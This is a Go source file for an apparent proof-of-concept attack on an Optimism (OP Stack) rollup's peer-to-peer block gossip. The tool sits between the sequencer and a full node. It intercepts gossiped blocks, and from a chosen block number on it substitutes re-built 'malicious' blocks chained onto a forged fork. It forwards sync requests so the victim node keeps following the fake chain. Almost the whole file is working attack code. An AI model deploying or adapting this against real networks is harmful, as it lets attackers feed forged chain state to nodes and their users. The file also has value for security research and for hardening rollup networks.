package main

import (
	"context"
	"crypto/ecdsa"
	"crypto/sha256"
	"fmt"
	"io"
	"log"
	"math/big"
	"net/http"

	"github.com/ethereum-optimism/optimism/op-service/client"
	"github.com/ethereum-optimism/optimism/op-service/eth"
	"github.com/ethereum/go-ethereum/common"
	"github.com/ethereum/go-ethereum/rpc"
	"github.com/golang/snappy"
	libp2p "github.com/libp2p/go-libp2p"
	pubsub "github.com/libp2p/go-libp2p-pubsub"
	pubsub_pb "github.com/libp2p/go-libp2p-pubsub/pb"
	"github.com/libp2p/go-libp2p/core/host"
	"github.com/libp2p/go-libp2p/core/network"
	"github.com/libp2p/go-libp2p/core/peer"
	"github.com/libp2p/go-libp2p/core/protocol"
)

type P2P struct {
	engine             *Engine
	gossipSubscription *pubsub.Subscription
	topic              *pubsub.Topic
	libp2pServer       host.Host
	libp2pClient       host.Host
	forkBlock          eth.Uint64Quantity
	maliciousChain     map[common.Hash]common.Hash
}

var (
	blockTopic        = "/optimism/%d/3/blocks"
	requestResponseId = "/opstack/req/payload_by_number/%d/0"
)

func NewP2P(gethEngineRpc string, jwtSecret []byte, privateKey *ecdsa.PrivateKey, addr string, chainId *big.Int, seqAddrInfo *peer.AddrInfo) *P2P {
	rpcClient, err := client.NewRPC(context.Background(), nil, gethEngineRpc, client.WithGethRPCOptions(
		rpc.WithHTTPClient(&http.Client{Transport: &jwtTransport{secret: jwtSecret}}),
	))
	if err != nil {
		log.Fatalf("engine RPC client: %v", err)
	}

	libp2pServer, libp2pClient, sub, topic := initP2P(addr, chainId, seqAddrInfo)
	p := &P2P{
		engine: &Engine{
			client:     rpcClient,
			privateKey: privateKey,
			chainId:    eth.ChainIDFromBig(chainId),
		},
		gossipSubscription: sub,
		topic:              topic,
		libp2pServer:       libp2pServer,
		libp2pClient:       libp2pClient,
		forkBlock:          0,
		maliciousChain:     make(map[common.Hash]common.Hash),
	}
	p.registerRequestResponse(context.Background(), seqAddrInfo.ID)
	return p
}

func (p *P2P) SetForkBlock(forkBlock uint64) {
	if forkBlock > 0 {
		log.Printf("setting block to fork at %d", forkBlock)
		p.forkBlock = eth.Uint64Quantity(forkBlock)
	}
}

// Creates the attacker's server-side libp2p host that fullnodes connect to.
// It joins the gossip topic so we can publish blocks to subscribers.
func initLibP2PServer(ctx context.Context, listenerAddress string, topicName string, pubSubOpts []pubsub.Option) (host.Host, *pubsub.Topic) {
	libP2PServer, err := libp2p.New(libp2p.ListenAddrStrings(listenerAddress))
	if err != nil {
		log.Fatalf("failed to create server host: %v", err)
	}
	log.Printf("lib p2p attacker peer ID: %s", libP2PServer.ID())

	serverPubSub, err := pubsub.NewGossipSub(ctx, libP2PServer, pubSubOpts...)
	if err != nil {
		log.Fatalf("failed to create server gossipsub: %v", err)
	}

	topic, err := serverPubSub.Join(topicName)
	if err != nil {
		log.Fatalf("failed to join server topic: %v", err)
	}
	log.Printf("joined server topic %s", topicName)
	return libP2PServer, topic
}

// Creates the attacker's client-side libp2p host that connects to the sequencer.
// It subscribes to the gossip topic so we can intercept blocks before gossiping them further.
func initLibP2PClient(ctx context.Context, seqAddrInfo *peer.AddrInfo, topicName string, pubSubOpts []pubsub.Option) (host.Host, *pubsub.Subscription) {
	// Since we connect to the sequencers gossip, we dont care about which port we bind it to
	// We set it to port 0, so the host OS chooses a random open port
	libP2PClient, err := libp2p.New(libp2p.ListenAddrStrings("/ip4/0.0.0.0/tcp/0"))
	if err != nil {
		log.Fatalf("failed to create client host: %v", err)
	}
	clientPubSub, err := pubsub.NewGossipSub(ctx, libP2PClient, pubSubOpts...)
	if err != nil {
		log.Fatalf("failed to create client gossipsub: %v", err)
	}
	if err := libP2PClient.Connect(ctx, *seqAddrInfo); err != nil {
		log.Fatalf("failed to connect to sequencer: %v", err)
	}
	log.Printf("connected to sequencer %s", seqAddrInfo.ID)

	clientTopic, err := clientPubSub.Join(topicName)
	if err != nil {
		log.Fatalf("failed to join client topic: %v", err)
	}
	sub, err := clientTopic.Subscribe()
	if err != nil {
		log.Fatalf("failed to subscribe: %v", err)
	}
	log.Printf("subscribed to %s", topicName)
	return libP2PClient, sub
}

// Initialize p2p set up
func initP2P(listenerAddress string, chainId *big.Int, seqAddrInfo *peer.AddrInfo) (host.Host, host.Host, *pubsub.Subscription, *pubsub.Topic) {
	// Just using a sha over the data, without this the subscriber will think every message is the same and not process it
	msgIDFn := func(msg *pubsub_pb.Message) string {
		h := sha256.Sum256(msg.Data)
		return string(h[:])
	}

	pubSubOpts := []pubsub.Option{
		pubsub.WithNoAuthor(),
		pubsub.WithFloodPublish(true),
		pubsub.WithMessageIdFn(msgIDFn),
	}

	topicName := fmt.Sprintf(blockTopic, chainId)

	ctx := context.Background()

	// Create our own lib p2p server, full node will connect here
	libP2PServer, topic := initLibP2PServer(ctx, listenerAddress, topicName, pubSubOpts)

	// Create our own lib p2p client, we connect to the sequencer here
	libP2PClient, sub := initLibP2PClient(ctx, seqAddrInfo, topicName, pubSubOpts)

	return libP2PServer, libP2PClient, sub, topic
}

// register request response for when a node missed some messages, so it can catch up
// What is does in our scenario is forwards requests from the fullnode to the sequencer and sends the response back.
// see https://github.com/EspressoSystems/optimism-espresso-integration/blob/4c769c98c924cb840d6d0bcc34fdeca910e5d030/op-node/p2p/node.go#L156
func (p *P2P) registerRequestResponse(ctx context.Context, seqID peer.ID) {
	protoID := protocol.ID(fmt.Sprintf(requestResponseId, p.engine.chainId))

	// The server listens for request response messages from the fullnode
	p.libp2pServer.SetStreamHandler(protoID, func(inStream network.Stream) {
		defer inStream.Close()

		// Read stream in from full node
		var req [8]byte
		if _, err := io.ReadFull(inStream, req[:]); err != nil {
			log.Printf("req/resp read request failed: %v", err)
			inStream.Reset()
			return
		}

		// Forward request to sequencer
		outStream, err := p.libp2pClient.NewStream(ctx, seqID, protoID)
		if err != nil {
			log.Printf("req/resp failed to open sequencer stream: %v", err)
			inStream.Reset()
			return
		}
		defer outStream.Close()

		if _, err := outStream.Write(req[:]); err != nil {
			log.Printf("req/resp failed to write request: %v", err)
			inStream.Reset()
			outStream.Reset()
			return
		}
		outStream.CloseWrite()

		// Write back to response from sequencer to full node
		written, err := io.Copy(inStream, outStream)
		if err != nil {
			log.Printf("req/resp failed copy response: %v", err)
			inStream.Reset()
			outStream.Reset()
			return
		}
		log.Printf("req/resp succesfully forwarded block response %d bytes", written)
	})
	log.Printf("registered req/resp forwarding on %s", protoID)
}

// Ask the engine to create a malicious block that we can further gossip downstream
func (p *P2P) injectMaliciousBlock(payloadEnvelope *eth.ExecutionPayloadEnvelope, parentHash *common.Hash) ([]byte, error) {
	log.Printf("building malicious replacement for block %d (chain len %d)", payloadEnvelope.ExecutionPayload.BlockNumber, len(p.maliciousChain))

	modifiedData, newBlockHash, err := p.engine.modifyPayload(payloadEnvelope, parentHash)
	if err != nil {
		log.Printf("modify error: %v, forwarding original", err)
		return nil, fmt.Errorf("failed to modify payload: %v", err)
	}
	p.maliciousChain[payloadEnvelope.ExecutionPayload.BlockHash] = newBlockHash
	log.Printf("added new malicious block hash %s -> %s (fork chained len %d)", payloadEnvelope.ExecutionPayload.BlockHash, newBlockHash, len(p.maliciousChain))
	return modifiedData, nil
}

func (p *P2P) run() {
	ctx := context.Background()

	for {
		// Receive the gossiped block
		msg, err := p.gossipSubscription.Next(ctx)
		if err != nil {
			log.Fatalf("subscription error: %v", err)
		}

		// Decode and unmarshal to get `ExecutionPayloadEnvelope`
		decodedData, err := snappy.Decode(nil, msg.Data)
		if err != nil {
			log.Printf("snappy decode failed: %v", err)
			continue
		}
		payload, err := p.engine.unmarshalPayload(decodedData)
		if err != nil {
			log.Printf("decode block failed: %v", err)
			continue
		}

		log.Printf("p2p recieved block %d from peer id %s", payload.ExecutionPayload.BlockNumber, msg.ReceivedFrom)

		// This is the data to be further gossiped
		outData := msg.Data
		// Check if we want to start a fork or not
		if payload.ExecutionPayload.BlockNumber == p.forkBlock {
			outData, err = p.injectMaliciousBlock(payload, nil)
			if err != nil {
				log.Printf("modify error at block number: %v, forwarding original", err)
				outData = msg.Data
			}
		} else if maliciousParent, ok := p.maliciousChain[payload.ExecutionPayload.ParentHash]; ok {
			// This means we forked at an earlier block
			// In order to keep the chain going after the fork we need to modify the payload with the malicious parent hash
			// Otherwise geth will reject it since it never received the correct one and the chain will stall
			outData, err = p.injectMaliciousBlock(payload, &maliciousParent)
			if err != nil {
				log.Printf("modify error for malicious parent: %v, forwarding original", err)
				outData = msg.Data
			}
		}

		// Gossip the message to anyone who has subscribed to the topic, the full node in this case
		if err := p.topic.Publish(ctx, outData); err != nil {
			log.Printf("publish error: %v", err)
		}
	}
}
